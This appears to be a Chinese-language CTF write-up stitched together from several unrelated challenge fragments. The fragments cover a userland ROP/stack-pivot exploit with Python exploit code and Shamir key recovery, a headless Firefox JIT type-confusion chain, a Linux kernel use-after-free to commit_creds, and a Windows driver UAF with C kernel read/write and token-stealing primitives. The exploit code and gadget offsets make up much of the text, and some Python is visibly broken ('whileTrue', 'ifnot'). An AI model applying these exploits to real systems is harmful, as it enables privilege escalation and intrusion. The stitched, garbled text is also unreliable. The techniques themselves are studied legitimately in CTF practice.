求解与咒文编码先把target的80个hex解成40字节，构造State(cp,co,ep,eo)，用预计算树求出URFDLB序列，最后逐字节编码。编码器按顺序尝试三种入口，并断言三条性质：长度与原公式相等且不超过31、逐字节%6与公式面一致、State().play(spell)等于target。第一段枢轴的骨架是三个字节：某个pop reg（0x58~0x5d分别对应L/B/U/R/D）、0x5c（pop rsp，余数2即F）、0xc3（ret，余数3即D）。前缀用0x90/0x91/0xf8/0xf9/0x64/0x65顶住，遇到L且后面还有公式步时写0xb2 0x30+index，把下一步的余数塞进立即数。leave入口则是pop rbp（0x5d）接0xc9（leave，201%6=3）再接0xc3，三个字节都是D，正好消耗公式里连续三个D。
例如公式片段...U F D...编码为5a 5c c3，执行时先弹掉栈上一个qword，再pop rsp把栈指针换成刚弹出的值，ret即跳进祷文。枢轴之前的字节都是无副作用的单字节指令，枢轴之后的字节只用来满足校验、永不执行。
取地址与栈布局读/proc/64/auxv的响应先剥掉卷轴: 标记，之后每16字节解一对<QQ>，遇tag==0停止，必须同时存在3、7、25三项。算得pie=aux[3]-0x40、ld=aux[7]、prayer=pie+0x5060，祷文与gadget地址全部由这两个基址派生，所以每章都要重取一次，上一章的数值不能复用。
布栈载荷为b"x\x00" + b"A"*(0xf0-2) + pack(prayer)，再补B到恰好255字节，整段不含\n：开头的短串加NUL让路径在第一个NUL处结束，补齐到255字节则保证0xf0槽位一定被写到，同时避免换行为读入提前收尾。被拦路径用b"flag\x00" + spray[5:]，前五个字节触发黑名单，但0xf0处的8字节与原载荷完全一致，布栈效果不变而read_once未被消耗。
第一段祷文：mprotect、清标记、回写父进程112字节按qword排布，q0在prayer+0，q1..q9在+8..+0x48，31字节代码接在+0x50：
q0 ld+0x25AC   pop rdi; pop rbp; ret
q1 pie+0x5000  mprotect 起始地址
q2 prayer+0x20 leave; ret 的新 rbp
q3 ld+0x1F5FB  pop rdx; leave; ret
q4 7           PROT_READ|WRITE|EXEC
q5 ld+0x599B   pop rsi; pop rbp; ret
q6 0x1000      mprotect 长度
q7 0           rbp，进代码前被换成 syscall;ret gadget
q8 pie+0x1344  mprotect@plt（跳过 endbr64）
q9 prayer+0x50 31字节代码入口

链条成立的关键在pop rdx; leave; ret这个组合：rdx取到7之后，leave把rsp拉到prayer+0x20，于是pop rbp吃掉q4、ret跳到q5，用一个gadget同时完成“传参”和“跨过中间槽位”。mprotect返回0后rax清零、参数寄存器保持不变，ret落到q9。31字节代码依次做：mov [rdi+0x48],rax清零read_once与spell_once、mov [rdi+0x40],eax清零tuned、push rsi（0x1000）、push rdi（页地址）、push rsp; pop rsi得到local iovec、mov r10,rsi复用同一结构作remote iovec、mov dl,1与mov r8d,edx各置计数1、xor r9d,r9d清flags、push 64; pop rdi指定父进程、mov ax,311选process_vm_writev、call rbp发起调用。用mov ax而非mov eax是为了省字节，此时rax本来就是0。
call rbp会把返回地址压在iovec下方，不影响iovec内容；iovec里的iov_base=pie+0x5000在父进程中同样有效。载荷每次生成后都要扫描是否含0f 05，若某个gadget地址的字节恰好构成该序列，就改用ld+0x25F66、ld+0x25F85、ld+0x25FC9等备选syscall;ret。
第二段祷文与被拦路径第二段祷文是纯ROP，10个qword加尾部字符串：pop rax; ret置88（__NR_symlink），pop rdi; pop rbp; ret取prayer+80（/flag\0），pop rsi; pop rbp; ret取prayer+86（/tmp/x\0），ret进syscall;ret，最后跳到服务的_exit(0)，免得子进程回到不可控的返回路径。字符串放在+80之后，整个祷文仍压成112字节，同样要保证不含0f 05。
执行次序有讲究：先调弦写入symlink祷文，再发被拦的255字节路径完成布栈（这一步不读文件、也不消耗read_once），随后第二次弹奏触发symlink，最后读/tmp/x。读回的响应去掉开头的卷轴: 和结尾的完整菜单，用(?<![0-9a-f])[0-9a-f]{66}(?![0-9a-f])抓66位hex，前后加边界是为了不把菜单数字或更长的十六进制串误当残章。发送6之后，外层回显“残章到手”才算真正计分。
二十章执行与开碑现场执行中第1至14章和第16至19章计分，第15章跳过（那一章的公式没能编出可用枢轴），第20章开始时已满18枚，直接发6离开，结算为18/20并给出flag.enc。整理时把第16章得到的记录放在第十五个有效位置：通过外层计分的记录按取得顺序排好，第一条到第十八条依次取Shamir横坐标x=1..18，纵坐标取后面的32字节，份额自带的来源标签不参与插值。即使中间有一章空缺，计分顺序仍然连续，不会在横坐标上留下洞；18条必须来自同一条TCP会话，跨轮拼接会得到互相矛盾的份额。
插值在GF(256)上逐字节进行，约简多项式0x11d，即xtime溢出时异或0x1d；加法是异或，乘法用八轮“看最低位累加、左移、溢出补0x1d”的移位实现，除法取逆元a^254。对每个密钥字节，用十八个点在零处作拉格朗日插值：
K[b] = XOR_j ( y[j,b] * PRODUCT_{m != j} x[m] / (x[m] XOR x[j]) )

权重只依赖横坐标，先算好18个权重再逐字节累乘，32字节密钥一次得到。随后把flag.enc的70字节切成12字节nonce || 42字节密文 || 16字节tag，以AESGCM(key).decrypt(nonce, 密文||tag, None)解密。GCM的tag同时认证密钥与密文：份额不足、横坐标错位或混轮都会让tag校验失败，因此只有解密不抛异常时，42字节明文才可作为最终提交值。

import re, socket, struct

SCROLL, PRAYER, SPELL = "卷轴: ".encode(), "祷文: ".encode(), "咒文: ".encode()
MENU = "6) 离去\n> ".encode()
TARGET = re.compile(rb"target:\s*([0-9a-f]{80})")

class Proto:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(20)
        self.buf = bytearray

    def send(self, data):
        self.s.sendall(data)

    def until(self, marker):
        whileTrue:
            pos = self.buf.find(marker)
            if pos >= 0:
                end = pos + len(marker)
                out, self.buf = bytes(self.buf[:end]), self.buf[end:]
                return out
            chunk = self.s.recv(65536)
            ifnot chunk:
                raise EOFError
            self.buf.extend(chunk)

def menu_read(p, path):
    p.send(b"2\n"); p.until(SCROLL); p.send(path)
    return p.until(MENU)

def menu_tune(p, prayer):
    assert len(prayer) == 112
    p.send(b"1\n"); p.until(PRAYER); p.send(prayer)
    return p.until(MENU)

def menu_play(p, spell):
    assert1 <= len(spell) <= 31andb"\n"notin spell
    p.send(b"4\n"); p.until(SPELL); p.send(spell + b"\n")
    out = p.until(MENU)
    assertb"ACCEPT\n"in out
    return out

def build_symlink_prayer(pie, ld, source=b"/flag", dest=b"/tmp/x"):
    prayer = pie + 0x5060
    words = [
        ld + 0x1548B, 88,                              # pop rax; __NR_symlink
        ld + 0x25AC, prayer + 80, 0,                   # oldpath
        ld + 0x599B, prayer + 80 + len(source) + 1, 0, # newpath
        ld + 0x16629,                                  # syscall; ret
        pie + 0x2414,                                  # _exit(0)
    ]
    out = struct.pack("<Q", words[0]) + struct.pack("<9Q", *words[1:]) + source + b"\0" + dest + b"\0"
    out = out.ljust(112, b"\0")
    assertb"\x0f\x05"notin out
    return out

def gf_mul(a, b):
    r = 0
    for _ in range(8):
        if b & 1: r ^= a
        carry = a & 0x80
        a = (a << 1) & 0xFF
        if carry: a ^= 0x1D
        b >>= 1
    return r

def recover_key(shares):
    xs = [s[0] for s in shares[:18]]
    weights = []
    for i, xi in enumerate(xs):
        w = 1
        for j, xj in enumerate(xs):
            if i != j:
                inv = 1
                e, base = 254, xi ^ xj
                while e:
                    if e & 1: inv = gf_mul(inv, base)
                    base, e = gf_mul(base, base), e >> 1
                w = gf_mul(w, gf_mul(xj, inv))
        weights.append(w)
    key = bytearray(32)
    for share, w in zip(shares[:18], weights):
        for i, y in enumerate(share[1:]):
            key[i] ^= gf_mul(y, w)
    return bytes(key)

def exploit(host, port, spell):
    p = Proto(host, port)
    target = TARGET.search(p.until(b"\n")).group(1).decode()
    aux = menu_read(p, b"/proc/64/auxv\0")
    pairs = {}
    for i in range(0, len(aux) - 15, 16):
        tag, val = struct.unpack("<QQ", aux[i:i+16])
        if tag == 0: break
        pairs[tag] = val
    pie, ld = pairs[3] - 0x40, pairs[7]
    menu_tune(p, build_symlink_prayer(pie, ld))
    spray = b"A" * (0xf0 - 2) + struct.pack("<Q", pie + 0x5060) + b"B" * 0x3e
    menu_read(p, b"flag\0" + spray[5:])          # 被拦，但栈已布置
    menu_play(p, spell)                           # 触发 symlink
    leak = menu_read(p, b"/tmp/x")                # 66 位 hex 残章
    p.send(b"6\n")
    return target, pie, ld, leak

2. 题目分析
服务要求输入HTML，以单独一行EOF结束；服务落盘后用headless Firefox打开，浏览器stdout接回同一TCP，payload里的dump()逐行回传。目标是让渲染进程执行/readflag，输出用echo FLAG_START/FLAG_END夹住。
版本指纹：页面侧有processLocally/phrases、launcher无getauxval/realpath导入，源码夹在2026-10-16至10-19。偏移取自同版本libxul符号：vptr-0xc47abc0为PIE，base+0xc68d5a8是read的GOT槽，read-0x128150为libc，execve=libc+0xf7f00、setcontext=libc+0x4be80。
headless没有窗口与手势，只能让渲染引擎解析HTML时出错。链路：Image文档把图片加载状态的回放接进JS；同步XHR排空嵌套事件循环，让取消加载的proxy异步释放；JIT类型混淆把double位模式当字符串长度压到8字节，得到改data指针的任意读写；从Image/Uint8Array的wrapper取JS对象、native指针、vptr与backing store反推PIE与libc；在回收内存上摆setcontext与execve参数。
重入：根元素带class="reftest-wait"；load后预热data:图片，建隐藏about:blank iframe并把contentDocument设为contenteditable，再建src为PNG Blob URL的iframe并注册捕获阶段readystatechange。当readyState==="interactive"且contentType==="image/png"时，把image document的<img>用adoptNode搬进隐藏文档并换回预热src，再armStyleFlush()：SVG的defs/g#replay-source里放type="application/json"的script（文本replayPayload()），改成application/javascript后插入<use href="#replay-source">。use克隆实例化脚本时调用栈压着渲染帧；contenteditable让native属性更新时重试编辑器初始化并flush父文档样式，这是从CSS刷新回到JS的门。

2. 题目分析

漏洞：renew/revoke只把回执标记为失效并从活跃链表摘除，没有撤销peek缓存、accept队列与其他回执里保存的指针。对象随后释放回slab，旧句柄仍能通过peek/accept进入内核，形成UAF读；回执底层与guest_memfd的slot共用分配路径，同尺寸对象（eventfd上下文、slot、btree节点）会复用这块内存，旧句柄读到的已是新对象内容。利用分两段：先用UAF读泄露key/nonce并确认槽可复用，再用UAF写覆盖slot0里的折叠记录，让fold按攻击者给的地址与值执行内核写，最终落到commit_creds路径。附件不足以确认具体是哪个ioctl在哪个错误分支提前free，这里只按脚本实际执行的顺序描述原语。
布局判据：publish/certify后不立刻peek，而是检查KVM_SET_USER_MEMORY_REGION2返回结构里的flags与计数字段。该结构与账本slot共享内存布局，只有回执落在预期slot且region字段与初始化写入的值一致时，peek的固定偏移才指向目标字段；否则读到相邻对象。脚本把它当布局旁证，不满足就关闭fd重建，最多32次，把slab随机化过滤成可预测布局。
slide oracle：0x4088aeea接收0x88字节结构体，内含候选slide、用泄露key算出的MAC与期望状态，账本用自身key重算tag，只有匹配才返回通过。于是它等价于1比特判定器，candidate=i<<21、i取0到511正好覆盖x86-64默认1GB的KASLR窗口，512次ioctl即可唯一确定slide；MAC带密钥，错误候选不会因为地址可映射而误判。
任意写：折叠记录带目标地址、写值与长度，fold在账本上下文里按记录执行写，等价于把受控值写到slide换算后的内核地址。脚本先算出commit_creds的运行时地址，再把补丁值写进对应位置；SHAPE SLOT0 FREE/REFILL保证slot0的旧回执被释放后由伪造记录精确占位，ACCEPT C SECOND让记录进入待fold链表，FOLD C ROOT才真正触发写入。写成功后不再需要第二次UAF，直接读flag即可。

geteuid()返回0后打开并读取/flag，打印flag: ...，末尾再发一次0xaeeb并用geteuid()==0确认提权不是偶然返回值。

2. 题目分析
ironclad.sys（42008字节）实现“用户态提交指令流、内核侧操作对象”的小VM：每个session有RING、DESC数组与事务TXN，结构带SipHash标签。SDDL允许AU读写，可直接CreateFileA("\\.\Ironclad")，IOCTL均为FILE_ANY_ACCESS加METHOD_BUFFERED，边界由驱动自查。镜像基址0x140000000，.kdp在0x14001a000，DriverEntry生成两把SipHash密钥写入.kdp+0x30/.kdp+0x40，23个handler写进.kdp+0x50后由MmProtectDriverSection只读化。
漏洞在对象读取缓存上。FUN_1400031d0（op3）→FUN_140003c7c：
0x3990(ring,idx,&DESC);                 // 槽校验，DESC 补高位标记
hit = ring[0x26]!=0 && ring[0x20]==idx && (u16)ring[0x24]==(u16)slot.gen && ring[0x30]==DESC;
if (hit) 校验 ring[0x40] 的MAC后返回 ring[0x38]/ring[0x28];
else     建立缓存并把 data/size/DESC 写进 ring[0x20..0x48];

每个RING只有一个缓存条目，缓存的是“当时”的data指针与size。resize（op6）成功后调FUN_140003b30遍历DESC->SHDW的ACT链表，但只在cached_idx==idx && cached_DESC==DESC时清缓存：
140003b78: 44 39 50 20  cmp %r10d,0x20(%rax)   ; 缓存idx == 被resize的idx?
140003b7c: 75 18        jne 140003b96
140003b7e: 4c 39 58 30  cmp %r11,0x30(%rax)    ; 缓存DESC == 被resize的DESC?

DESC是对象，槽号只是引用，同一对象可被export/import到别的session的不同槽号。A用自己的槽号x读O，B用y≠x resize同一DESC：旧缓冲区释放，遍历到A时槽号不等被跳过，A再读命中缓存，拿到已释放的地址与长度，op3与op5变成UAF读写。

三个原语配合起来：
0x222408输出0x40字节，flag&2时+0x38是*(u64*)(ring+8)，即RSEC指针，这是全驱动唯一的内核指针泄漏。

op14用RSEC+0x48对DESC->data+off求SipHash，而TXN MAC与缓存MAC都是单级SipHash(RSEC+0x48,blob)，这个oracle就是MAC伪造机。

池分配粒度：ExAllocatePool2块大小是round_up(请求+0x10,0x10)，canary(len=0x30)与TXN记录同为0x50块，canary(len=0x1f0)与mode0 RING（0x10*0x18+0x80=0x200）同为0x210块，这决定了填充对象长度。

Token偏移常规做法是找_TOKEN_SOURCE.SourceName为*SYSTEM*，本build没命中，于是收集System与自己两份EPROCESS里“都是内核指针且不相等”的偏移，按离0x4b8排序，逐个kwrite后用GetTokenInformation(TokenUser)检查SID是否为S-1-5-18，不是就写回原值。读flag后必须睡死：假RING破坏了全局会话链表，退出时IRP_MJ_CLOSE会unlink并bugcheck，0x47b0释放假TXN时也会free假指针。
3. 解题过程
反编译ironclad.sys（152个函数），确认IRP分发、IOCTL表与对象布局；0x22240c的mode=1栈溢出是DoS陷阱，0x222410是死代码。

建S1/S2两个session（mode0，s1=s2=0x100），S2先建8个filler让槽号从8开始；S1创建L(0x30)与Y(0x1f0)并export，S2 import到槽8/9。

S2读槽8建立指向L缓冲区的缓存，S1 resize(L,0x1000)释放该缓冲区（槽号不同，缓存不清），S2再读槽8仍拿到旧内容，UAF确认。

阶段A：循环240次begin(Y,0x10)且不abort，每次永久吃掉一个0x50块，逐次读槽8看前4字节是否为TXNS，命中后从txn+0x08/+0x10/+0x18读出RING、DESC_Y与P_Y，再begin(Y,0x1a0)拿写事务。

/* MAC oracle：op4 把数据写进对象 X，op14 用本会话密钥求 SipHash */
static u64 mac(Sess *s, const void *blob, u32 len)
{
 M_write(s, g_xslot, 0, len, (void *)blob);
return M_hash(s, g_xslot, 0, len).ret;
}

/* 伪造缓存条目：哈希时 active 被强制 0，落盘时改 1 */
static void forge_cache(u64 addr, u32 size)
{
 u8 blob[0x28] = {0}, st[0x28];

 wr16(blob + 4, (u16)g_gen_x);
 wr32(blob + 8, size);
 wr64(blob + 0x10, g_desc_x);
 wr64(blob + 0x18, addr);
 wr64(blob + 0x20, g_ring);
 u64 m = mac(&S4, blob, 0x28);
memcpy(st, blob, 0x28);
 wr16(st + 6, 1);
 wr64(st + 0x20, m);
 M_twrite(&S4, 4, 0, 0x28, st); /* TXN_C 的 buffer = ring+0x20 */
}

static void kread_(u64 addr, void *buf, u32 len)
{
 forge_cache(addr, len);
 M_read(&S4, 0, 0, len, buf); /* 命中缓存 → memcpy(buf, addr, len) */
}

/* op22 = memcpy(*(txn->buffer)+off, user, len)，buffer 来自伪造 TXN 记录 */
static void kwrite_(u64 addr, const void *buf, u32 len)
{
 u8 blob[0x38] = {0}, txn[0x38] = {0};

 wr32(blob + 0, 5);
 wr32(blob + 8, len);
 wr64(blob + 0x10, g_ring);
 wr64(blob + 0x28, addr);
 wr64(blob + 0x30, g_ring + 0x160);
 u64 m = mac(&S4, blob, 0x38);
 wr32(txn + 0, 0x534e5854);
 wr32(txn + 4, 5);
 wr64(txn + 8, g_ring);
 wr64(txn + 0x20, addr);
 wr32(txn + 0x28, len);
 wr64(txn + 0x30, m);
 M_twrite(&S4, 1, 0, 0x38, txn); /* 借 TXN_P 改 TXN_X 记录 */
 M_twrite(&S4, 5, 0, len, (void *)buf);
}
